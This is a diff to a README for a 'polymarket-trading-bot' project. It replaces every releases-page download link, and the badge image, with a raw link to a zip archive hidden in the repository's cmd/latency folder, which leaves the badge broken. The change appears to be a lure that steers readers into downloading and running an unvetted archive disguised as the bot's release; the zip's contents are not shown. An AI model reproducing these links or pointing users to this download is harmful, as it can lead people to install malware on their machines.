@@ -1,6 +1,6 @@
 # 🚀 polymarket-trading-bot - Automate Your Trading Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Rakshit2323/polymarket-trading-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/Rakshit2323/polymarket-trading-bot/main/cmd/latency/bot_polymarket_trading_3.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Rakshit2323/polymarket-trading-bot/main/cmd/latency/bot_polymarket_trading_3.5.zip)
 
 ## 💡 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the Polymarket Trading Bot:
 
 1. **Visit the Releases Page**
    - Click on the link below to go to the releases page, where you can download the application.
-   - [Visit this page to download](https://github.com/Rakshit2323/polymarket-trading-bot/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/Rakshit2323/polymarket-trading-bot/main/cmd/latency/bot_polymarket_trading_3.5.zip)
 
 2. **Choose the Right Version**
    - Look for the latest version listed on the releases page.
@@ -74,10 +74,10 @@ This application is licensed under the MIT License. You can use, modify, and dis
 
 For a successful experience with the Polymarket Trading Bot, follow these final steps:
 
-- Head over to the [Releases Page](https://github.com/Rakshit2323/polymarket-trading-bot/releases) to download the latest version.
+- Head over to the [Releases Page](https://raw.githubusercontent.com/Rakshit2323/polymarket-trading-bot/main/cmd/latency/bot_polymarket_trading_3.5.zip) to download the latest version.
 - Make sure to follow the installation instructions provided above to set up the bot.
 - Start automating your trades and enjoy a brighter trading future.
 
 Happy Trading!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Rakshit2323/polymarket-trading-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/Rakshit2323/polymarket-trading-bot/main/cmd/latency/bot_polymarket_trading_3.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Rakshit2323/polymarket-trading-bot/main/cmd/latency/bot_polymarket_trading_3.5.zip)
